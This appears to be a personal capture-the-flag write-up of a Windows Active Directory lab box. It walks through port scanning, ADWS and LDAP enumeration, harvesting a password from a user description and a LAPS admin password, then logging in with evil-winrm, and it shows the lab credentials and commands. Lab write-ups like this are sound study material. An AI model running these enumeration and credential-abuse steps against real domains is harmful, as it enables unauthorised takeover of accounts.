---
Status: 🟢
OS: Windows AD
Difficulty: Medium
tags:
Date: 2026-09-22T01:46:00
Owned: 2026-10-02T01:46:00
---

---
# Enumeration
## port scan
rustscan  
```sh
rustscan -a 192.168.189.122 --ulimit 5000 | tee rust.txt
```

![[Pasted image 20260922004633.png]]

2nd attemp rustscan with same command  
![[Pasted image 20260922010528.png]]

we have adws service on port 9389 
to enumerate on this service we need client here i will use sopa which is golang based  
https://github.com/Macmod/sopa  
```sh
go install github.com/Macmod/sopa/cmd/sopa@latest

echo 'export PATH=$PATH:$HOME/go/bin' >> ~/.zshrc
source ~/.zshrc
```

## ADWS Enumeration
https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/adws-enumeration.html

query for metadata
```
sopa mex --dc <DC>
```
![[Pasted image 20260922010058.png]]

# Initial Foothold
## LDAP Enumeration

enum for user however i found interesting description  
![[Pasted image 20261002010244.png]]

`fmcsorley:CrabSharkJellyfish192`

using filter as in [[Cascade#fidgeting around]]  
we can also find the field  
```
grep -Ei "pwd|password|info" ldapresult.txt | grep -Ev "badPwdCount|badPasswordTime|pwdLastSet
```
![[Pasted image 20261002010725.png]]

the creds found look like its only valid with smb and ldap  
![[Pasted image 20261002010829.png]]

we have some default share with READ access  
![[Pasted image 20261002010848.png]]

nothing interesting on the shares

## Enumeration again

finding other service to use on, checking the rustscan result again show there is port 80  
![[Pasted image 20261002011751.png]]

### Directory enumeration
```sh
feroxbuster -u http://192.168.145.122 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

![[Pasted image 20261002012012.png]]

nothing, system_web is forbidden  

tried other 2 wordlists, common.txt and directory-list-2.3-medium.txt and found nothing useful  


### Query Ldap with cred

We could query again for more information  
```sh
nxc ldap 192.168.145.122 -u 'fmcsorley' -p 'CrabSharkJellyfish192' --query "(sAMAccountName=*)" "" | tee ldapresult2.txt
```

using the filter to look for password again  
```sh
grep -Ei "pwd|password|info" ldapresult2.txt | grep -Ev "badPwdCount|badPasswordTime|pwdLastSet"
```

we found interesting password field, actually this is laps password for admin
![[Pasted image 20261002013553.png]]

![[Pasted image 20261002013800.png]]

we could try the password with local admin on the host `Administrator:[JHgBF5!v8D;uK`  

![[Pasted image 20261002014028.png]]

the password is valid and we show pwned on all service  

let's login using winrm  
```
evil-winrm -i 192.168.145.122 -u 'Administrator' -p '[JHgBF5!v8D;uK'
```

logged in as admin  
![[Pasted image 20261002014247.png]]

get the flag  
![[Pasted image 20261002014231.png]]

don't forget user flag as well  
![[Pasted image 20261002014439.png]]


# Lesson Learned  

Before doing something complicated, try the easy way first. In this Lab we just need to enumerate again thoroughly with the new credentials we have.%%%%